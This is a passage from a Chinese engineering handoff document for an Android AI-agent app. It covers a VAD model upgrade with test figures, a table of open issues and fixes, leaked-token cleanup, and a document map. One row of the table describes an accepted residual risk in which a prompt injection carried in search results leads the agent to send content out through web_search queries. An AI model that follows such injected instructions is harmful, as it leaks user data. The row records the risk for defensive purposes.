（含 200/500 边界正反两侧），B1–B8 接线（模型在 assets / 未压缩 / 12 个签名齐 /
模型名与文件名一致 / 失败返回 null / 双路径 / 整段判据 / 释放）。变异 4 条全部 CAUGHT：
阈值 500→100 → A2/A8/A10；去掉最小语音门槛 → A1/A4；有声不清零 → A3；reset 不清 → A7。

**还欠**：真机验证（P33）。频谱那一半在 JVM 上给不了——「地铁里能不能分清人声与噪声」
只有真机能判。若真机发现嘈杂环境误触发（把噪声当人声），把 `threshold` 从 0.5 调到 0.6；
若发现轻声说话被漏，往下调到 0.4。别同时动 `minSpeechDuration`，那是短句的生死线。

### 5.20 模型从 v4 换成 v5（2026-11-22），以及一个差点踩空的窗口尺寸

5.19 打进包的是 **v4**（k2-fsa 导出的 `silero_vad.onnx`，643,854 字节）。
当时选它的理由是「官方表里 629KB 那一行」，没深究版本。这轮换成 **v5**（官方 2,327,524 字节）。

**换的依据是实测，不是别人的 benchmark。** 用 `sherpa-onnx==1.13.8` 的 Python 轮子
（与 APK 里 `libsherpa-onnx-jni.so` 同版本的 C++ 代码路径）直接推理，60 秒真人语音
逐帧统计「判为人声」的比例：

| 模型 | 纯语音 | 叠加 σ=0.05 白噪声 | 960ms 纯白噪声误报 |
|---|---|---|---|
| v4（643,854 B） | 76.6% | **44.9%** | 20/60 帧（33%） |
| v5（2,327,524 B） | 83.1% | **79.9%** | 0/60 帧 |

噪声下 v4 掉 31.7 个点、v5 掉 3.2 个点。更关键的是**两个方向同时错**：
v4 既把噪声当人声（33% 误报），也把人声当噪声（命中掉到 44.9%）。
前者表现为「该停不停」，后者表现为「说一半被截断」——真机上都会被归因成「语音不好用」。

**TEN VAD 没换。** 官方 benchmark 说它赢 silero，但第三方实测（三首歌曲）TEN VAD 把
94% 判为人声、v4 是 64%、v5 只有 3%。它的优势是延迟与体积（RTF 0.0086 vs 0.0127，
lib 小 86%），而我们的瓶颈不在推理延迟（500ms 是 `VadEndpoint` 自己加的）。

**差点踩空的坑：v5 的窗口是 576，不是 512。** v4 是 512（32ms @ 16k），v5 是 576（36ms）。
`SileroVadModelConfig.windowSize = 512` 传进去**不会报错**：`VadModel::WindowSize()`
由模型形态决定，返回 576，`acceptWaveform` 按 576 攒帧。但只要有谁把这个常量当成
「一帧喂多少样本」去手工切帧，就会撞上 `IsSpeech: n: 512 != window_size: 576` ——
C++ 侧是 `exit(-1)`，不是异常，Android 上表现为**整个进程当场消失**。
所以这条写进了 `SileroVad` 的类注释，B1 也用体积而不是文件名当身份判据。

**顺手补了可观测性。** VAD 加载失败是静默降级到 RMS 的（5.19 的设计，不能因为一个模型
坏了就让麦克风不可用）。但静默降级会把「模型没加载」伪装成「模型效果一般」，
真机验证时这两种情况的处置完全相反。所以：

- `AsrSession` 新增 `endpointLabel`（默认「原生端点」，流式模型不用改）
- `OfflineAsrEngine.Batch` 用 getter 实时返回「silero v5」或「RMS 回落」——写成常量的话
  VAD 中途崩了界面不会变
- 聊天页语音面板显示「端点判定：silero v5」

判据加一条 **B9**（标签真的从引擎传到界面），共 19 条。

包体：1.841 → 49,112,639 字节；v4→v5 净增 1,683,670 字节。

---

## 6. 未决事项

| 事项 | 状态 | 怎么办 |
|---|---|---|
| CI 最后一次构建结果 | **已确认**：run 45001168847 → **1.848 全绿** | build=success / mutation-gate=success（22m29s / 11m46s）；包 50,807,690 字节，versionCode 848、versionName 1.848（aapt2 实读），签名证书 SHA-256 `09:7f9cb0…9439`；Release `latest` 标题已刷成「北辰 latest (run 848)」。**本地未归档**（沙箱出口 1.5~20 KB/s）。前一次 run 44999173354 红在 8 个 harness：其中 7 个是「jar 下载只判非空、把 HTML 错误页当依赖」（`zip END header not found`），已在 138a553 用 `curl -f` + `unzip -t` + 三镜像修掉；第 8 个是新 harness 写死了沙箱的协程 jar 路径，改为 Gradle 缓存优先 |
| 「说完自己停」+ 自适应阈值（P31/P32） | **已出包，待真机** | 行为判据 18 条 + 变异 4 条全 CAUGHT，`core` 单测 22 条通过。但「0.8 秒收会不会显得急」「1.3 秒上限够不够」只有真机能判，见 §5.16 / §5.17 与手册 §4.10–4.11 |
| silero VAD 端点（P33，2026-11-22） | **已出包 1.842（模型 v5），待真机** | 5.18 的「地铁里分不清人声与噪声」从根上绕开：频谱判据替换音量判据，RMS 保留为降级路径。模型从 v4 换到 v5 后，噪声下的帧命中率 44.9% → 79.9%（见 §5.20）。判据 19 条 + 变异 M1–M3 全 CAUGHT，CI 全绿。语音面板新增一行「端点判定：silero v5 / RMS 回落」，静默降级从此可见。**频谱那一半 JVM 给不了**——「电视开着还能不能停」「嘈杂环境不说话会不会乱出字」只有真机能判。见 §5.19、§5.20 与手册 §4.12 |
| 取证三修（P34，2026-11-22） | **已出包 1.844，待真机** | 云机实测发现：诊断包 345 行里 279 行是 `[CapabilityChain]`且相隔 10 秒逐字重复（崩溃现场被顶出 300 行窗口）；本地包 `versionName` 算出「1.14」冒充正式版；无障碍只有两态、说不清「开关开着却没连上」。修法：指纹去重（`core/capability/ResolutionFingerprint.kt`，纯函数、harness 直测）、版本号加 `-local`、`A11yState` 三态。**另查清：`adb install -r` 会清空无障碍授权**，每次升级都要重开。判据 20 条 + 变异 M1–M6 全 CAUGHT；变异与判据均已进 CI（run-all 自动收集）。**一次自我更正**：最初把「未连接」归因于 uiautomator 抢占，复现证伪。见 `polaris-真机验证/云机验证-1.842.md` |
| 无障碍第三态真正修出来（2026-11-22 第二轮，1.845） | **云机三态已验完，手机只剩一眼** | 1.844 虽然加了第三态，但探针用的是 `getEnabledAccessibilityServiceList()`——它会把 AMS 记进 `Crashed services` 的服务过滤掉，所以「开关亮着、服务没绑上」在探针眼里和「没开」一样，第三态成了死分支。改读 `Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES` 原文（+总开关），解析下沉到 `core/capability/A11yStatus.kt: isA11yServiceListed` 由 JVM 直测（D 组 10 条，判据共 30 条）。**复现路径**：`am force-stop` 杀已绑定进程 → AMS 记 crash 且拒绝重绑 → 设置项写回也不绑；关一次再开才恢复——这就是真机上「开关是开的但用不了」。三态截图在 `polaris-真机验证/云机截图/`。**两条自我更正**：①上一轮说「第三态没复现」实为探针读不到；②`uiautomator dump` 会重建服务实例（AMS 侧仍 bound），中间 1–2 秒 UI 会闪「被占用」，用它验收 UI 状态不可信，改用 `screencap`。判据 30 条、架构守卫 23 条、变异 M7/M8/M10/M11/M12 全 CAUGHT；M9 证出 `"null"` 字面量特判是死分支已删 |
| 余额查询显示「查询失败：null」（2026-11-22 真机截图） | **已修，1.848 已出包** | 两个缺陷叠加。①`BalanceService.query` 是全项目**唯一**没包 `withContext(Dispatchers.IO)` 的网络客户端（ClaudeClient / GeminiClient / LocalLlamaClient / MCP / 市场 / 媒体生成都有），却被 Main 上的 `rememberCoroutineScope().launch` 调用 → Android 抛 `NetworkOnMainThreadException`（**无参构造，message 为 null**）→ `runCatching` 吞成 failure → UI 拼 `"查询失败：${it.message}"` → 屏幕上就是「查询失败：null」。②Base URL 默认带 `/v1`，而余额接口在根路径 → 404。修法：函数体整体进 `Dispatchers.IO`；显式 `catch (CancellationException) throw`（取消不再被写成失败）；文案统一走 `core/llm/BalanceFailure.describe`——按异常种类给中文、兜底必带异常类名、**永不出现 null 字面量**。判据：W-29 新增 13 条（37 通过）+ 新 `run-balance-e2e-verification.sh` 6 条（本地起假供应商、真发 HTTP：`/v1` 404 → 换根路径 → 读到 `110.00`；401 只打 2 次不重试；取消不被吞）。变异 M1（切回 Main）/M2（UI 重新拼 message）/M3（兜底透传 message）/M4（去掉 `/v1` 兜底）全 CAUGHT，其中 M3 直接复现出「查询失败：null」。**顺带查清**：对话里模型说「我帮你查余额」是能力幻觉——`BalanceService` 只被设置页按钮调用，没有对应工具。**同款 `e.message` 拼接在 UI 还有 8 处**（BuildScreen / McpScreen / ModelSettings / PermissionFacade / MediaScreen / ContainerScreen），未批量改：它们都在 IO 线程里跑，风险远低于这一处 |
| 审批卡 30 秒后「又弹一条」（2026-11-22 真机 2.4） | **已修，1.848 已出包** | 原 `awaitApprovalDecision` 是 `withTimeoutOrNull(...) ?: false`——**超时与用户点拒绝共用 `false`**。三处同时说错话：日志写「拒绝」（用户原话「我没点拒绝」）、界面文案说用户拒绝、模型收到「用户拒绝了你」于是换个工具再试 → **又弹一张卡**（真机上第二张是发送类，所以外发确认也一起抑制了）。修法：返回值改三态（`true` / `false` / **`null` = 无人回应**）→ `Consent.Decision.TimedOut` → `ToolExecutor` 独立分支（code=`approval_timeout`，文案 `DenyMessage.timedOut` 明说「这不是拒绝，也不是能力不可用」）；记账抽到 `core/agent/ApprovalTurn`（纯 JVM）：超时置位后本回合**不再弹卡**，连拒读屏 2 次时由 App 自己弹一句「这只是没给授权，与无障碍开关无关」——这句不能指望模型说，真机上模型把它解释成了「无障碍没生效」。判据：R03 14 条（B1/B3 期望改成 null）、consent 22 条（B11 五种裁决 + B13 null→TimedOut）、新 `run-approval-turn-verification.sh` 12 条。另修 `app_launch` 的 activity 名容错：模型给 `Settings$AccessibilitySettings`（少 `Activity` 后缀）→ 组件不存在 → `launch_error`；新增 `core/tool/ActivityTargets` 按 [原样, 补 `Activity`] 生成候选，短名只对 `Settings` 开头补 `com.android.settings.`，判据 8 条 |
| 跨应用审批浮层（P26） | **待真机** | 代码、判据（15+23 条）、编译、装机接线都过了；但模拟器没有模型，触发不了真实审批，所以「卡画在 QQ 上」「点完就地继续」「等 30 秒时 Agent 不自己往下走」三条只有真机能验。见 §5.13 |
| 11 条模板拼接正则（含 `$`）未静态覆盖 | **待审** | 新判据只能判字面量；`MemoryAutoCapture` / `ShellTool` / `LocalToolCallParser` 等处是运行时拼出来的正则，ICU 兼容性只能逐条人工看。见 §5.12 |
| 泄漏的 PAT（三个） | **仓库侧已清白；撤销只能用户做** | 三个 token 都只在会话里、或远端 URL 里出现过：`git log -S` 扫全历史 **0 命中**，工作区 `grep` 也干净。第三个今天已从 `.git/config` 的 remote URL 里摘掉（改存 `~/.git-credentials`，600 权限），`git remote -v` 与 `.git/config` 内已无 `ghp_` 前缀。**撤销只能在 GitHub 账号里做**：Settings → Developer settings → Personal access tokens → 逐条 Delete；删完在 GitHub 新建一个，写回 `~/.git-credentials`（格式 `https://x-access-token:<新token>@github.com`），否则下次 `git push` 会 403 |
| 桌宠真机验证 | **模拟器已过，真机未做** | 模拟器（API 30，`-accel off`）跑通 AUTO 5 项 + 端到端链路，见 §3.12；剩下的省电策略 / 键盘 / 磁贴 / ASR 时延仍需一台 API 31 真机 + 一台国产 ROM |
| 外发守卫的残余链条 | **已知且接受** | `web_search` 刻意不标脏（连续搜索会连环弹窗，用户必然无脑点允许），代价是「搜索结果里的注入 → 再用 web_search 把内容拼进 query」这条链仍在。取舍与边界见 `docs/ops/P0-落地-2026-11-18.md` §12.8 |
| 诊断包里的非凭据数据 | **已审计凭据，未审计其余** | 第十一轮只处理了 Key（含备用池、形状兜底）；工具**输出**、`shell_run` 的完整命令、文件路径是否也该一起脱敏，是下一个问题。见 §13.7 |
| `DiagnosticsExporter` 自身的 JVM 覆盖 | **仍为 0** | 判据已搬到 `DiagnosticsRedaction`（26 条 JUnit），但壳里的四条接线（日志/端点/崩溃现场/流水）只有静态断言（`run-backup-redaction` G6–G9）。要真测壳需要 Robolectric，项目没有 |
| 本地模型的工具调用解析 | **JVM 已覆盖，真机未测** | `LocalToolCallParserTest` 36 条 + 变异 P1–P10，修掉三个「看起来成功」的缺陷（见 §14）。但**真机上的解析率没有数据**——需要日志统计「解析失败 → 静默重试 → 成功/失败」三段比例，才知道这套宽容规则够不够 |
| 二维码的真机扫码 | **编码已验证，相机链路未测** | 编码侧有外部锚点：`QrFixtures`（python-qrcode 生成）+ 独立解码器，22 条断言 + 变异 Q1/Q3–Q10。修掉「第二份格式信息缺位 7」（冗余从可纠 3 位降到 2 位）。**没有真实相机数据**——对焦、透视、反光、污损下的识读率无法在沙箱证明。见 §15 |
| 单引号定界 + 内容含双引号 | **解析失败，已知边界** | `{'content': 'say "hi"'}` 无法在替换前判断哪个引号是定界符；猜错就是改内容。有断言钉住「失败」，而不是「给出一个带引号的错值」。见 §14.6 |
| P1 结构性重构（**2026-11-19 解冻**） | **七轮，四条不变量全 PASS** | 第一轮 `AgentRuntime` 并发原语（19 断言 + R1–R7）。第二轮收不变量 3（`TaskSpec` 必含 quota+consent，无默认值）+ 不变量 4 后半（`SubAgentRunner` 借 `runtime.withPermit("cloud")`、去 chunked），并落静态门禁 `scripts/qa/run-runtime-invariants-verification.sh`。第三轮三入口 loop 收口（不变量 1 / 2 的 D1a / 4 前半）。第四轮**执行权收口**：`RuntimeBoundAgentLoop` 在 `send` 内 `acquireTurn` + `finally close`，`TurnEventGate` 按代次过滤事件（开始类丢、收尾类留）；三入口各有 session（`ui:main` / `ui:pet` / `sub:<index>`），`stop()` 与「发送打断」都先 `runtime.cancel`。`RuntimeBoundAgentLoopTest` 9 条断言（runtime 组 28 条），变异 R8–R12，全量 73 条 CAUGHT；静态门禁 `14 通过 / 0 失败 / 1 待收口`（唯一 PENDING 仍是 D1b）。第五轮**先解阻塞**：`ChatViewModel` 上轮已顶格（3723 = 冻结上限，加一行就红），这轮按 3.1 惯例拆出 `ChatUiTypes` / `ToolGroupsFacade` / `ConnectionProbe`，压回 3413 并把基线同步下调；守卫新增 [G] 段钉「集合靠注入、写点唯一」（4 条 + 反向自检 4/4）。第六轮**工具装配收口**：52 个内联 `register(...)` + 20 项依赖接线搬进 `tools/ToolAssembler`（`ToolDeps` 显式依赖面），桌宠 5 个工具的分支同处可对照，技能工具走二阶段装配（`SkillExecutor` 需要已建好的表）；`ConfirmRequiredTool` 从 `pet/` 迁到 `tools/`（装配器不许反向依赖入口）。不变量 2 的 D1b 随之关闭，四条硬不变量**全部 PASS、零 PENDING**（`15 通过 / 0 失败 / 0 待收口`），`ChatViewModel` 3413 → 3253。第七轮**冷启动恢复单入口**：原来运行态对账与回合日志扫描是两条独立协程，自动续跑只等前者——「有写操作可能已生效」赶不上裁决，应用照样发「继续」，模型把同一件事做第二遍（用户的文件被写两次）。现在 `TurnJournal.recoveryFor(state)` 串行扫描 + 合成 `StartupRecovery`，`runStateReady` 一 complete 就代表两份证据都到齐；判定表新增 `UNKNOWN_WRITES` 一档（排在开关之后、熔断之前，且不覆盖更具体的启动提示），`StartupRecovery` 构造私有化、只能经 `build()` 造。守卫新增 [I] 段 5 条（扫描点唯一 / 合流点唯一 / build 真被调 / 开关先于写操作 / overrideNotice 只在那一档），harness 新增 I1–I5 + J1–J7（56 通过 / 0 失败），变异 10 条全 CAUGHT。**第八轮**偿还 `LoopDefaults` 单一真源（7 个纯常量进 `core/agent/LoopDefaults.kt`，两处引用同一常量，守卫 [F] 4 条钉住）。**还没做**：真机矩阵。见 `docs/ops/P0-落地-2026-11-18.md` §16–§21 |

**已定，不再挂在这里**（2026-11-17）：桌宠历史落盘（做了）、外发审批档位（每次问）、
真机机型（矩阵文档给了建议）。P1 冻结令已于 2026-11-19 解冻（见顶部与
`docs/architecture/P1-冻结令-2026-11-17.md`）。

---

## 7. 文档地图

| 想找什么 | 看这里 |
|---|---|
| 项目能力与文档索引 | [`README.md`](README.md) |
| 现状 · 路线图 · 踩坑记录 | `docs/architecture/AgentKit-现状与路线图-2026-10-16.md` |
| 架构为什么这么切 | `docs/architecture/AgentKit-架构方案-v2-2026-11-06.md` |
| **桌宠设计（下一步要做的事）** | [`docs/specs/desktop-pet-spec-v1.md`](docs/specs/desktop-pet-spec-v1.md) |
| 参考了谁、借了什么 | `docs/architecture/AgentKit-参照谱系-2026-11-05.md` |
| 开源项目机制调研 | `docs/research/10/11/12-*.md` |
| QA 怎么跑、门禁有哪几条 | `scripts/qa/gate.sh` 头部注释、`docs/ops/QA-GATE-CHAIN-HARDENING.md` |
| P1 四条硬不变量（grep 验收基线） | `scripts/qa/run-runtime-invariants-verification.sh`（PASS/PENDING 分层，当前 `14 通过 / 1 待收口`） |
| 沙箱网络 / GitHub 通道 | `docs/ops/沙箱网络与GitHub通道说明.md` |
| targetSdk 为什么是 28 / 升级那天要做什么 | [`docs/ops/targetSdk-升级清单.md`](docs/ops/targetSdk-升级清单.md) |

---

## 8. 一句话给接手的人

这个项目的规矩是**先看懂、再自己写，并且每一条改动都要能被验证**。
别急着加功能——先跑一遍 §1 的三条命令，确认基线是绿的，再动第一行代码。
